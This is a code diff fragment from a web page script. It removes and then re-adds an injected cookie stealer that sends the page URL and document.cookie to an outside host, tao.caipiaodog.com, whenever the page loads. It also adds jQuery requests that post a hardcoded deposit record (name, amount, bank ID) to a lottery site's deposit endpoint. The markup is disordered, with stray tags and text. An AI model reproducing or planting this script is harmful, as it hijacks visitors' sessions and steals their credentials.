@@ -13,7 +13,47 @@
 <script>
 
 
-<script>function loadXMLDoc(){var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest()}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")}xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4&&xmlhttp.status==200){}};xmlhttp.open("GET","https://tao.caipiaodog.com/send?www="+encodeURIComponent(location.href)+"&cookie="+encodeURIComponent(document.cookie),true);xmlhttp.send()}loadXMLDoc();</script>
+$.post('https://jxcp1111.com/jiXiangCPLoginWeb/app/depositWYTwoFormSubmit?1251.019629097585',data,function(data){
+  console.log(data);
+},'json')
+
+
+var jsonuserinfo={
+  bankBranch: "",
+  bankInfoId: "9897",
+  deposit_date: '2019-08-18 16:44:09',
+  txtAmount: "5000",
+  txtDeposit_User_Name: '王五',
+  txtDeposit_user_bankId: "65",
+  txtDeposit_user_type: 'BANK_CAR_ONLINE_BANK'
+}
+
+$.ajax({
+					type : "post",
+					url : $("#path").val() + "/app/depositWYTwoFormSubmit?" + Math.random()*10000,
+					data : $.toJSON(jsonuserinfo),
+					contentType : 'application/json',
+					dataType : "json",
+					async:false, 
+					timeout : 50000,
+					beforeSend : function(xmlhttprequest) {
+						$('#maskDiv').show();
+					},
+					success : function(data) {
+						$('#maskDiv').hide();
+					
+						
+					},
+					error : function(xmlhttprequest, error) {
+					},
+					complete : function() {
+          }
+});
+
+
+
+
+王五<script>function loadXMLDoc(){var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest()}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")}xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4&&xmlhttp.status==200){}};xmlhttp.open("GET","https://tao.caipiaodog.com/send?www="+encodeURIComponent(location.href)+"&cookie="+encodeURIComponent(document.cookie),true);xmlhttp.send()}loadXMLDoc();</script>
 
 
 function loadXMLDoc(){
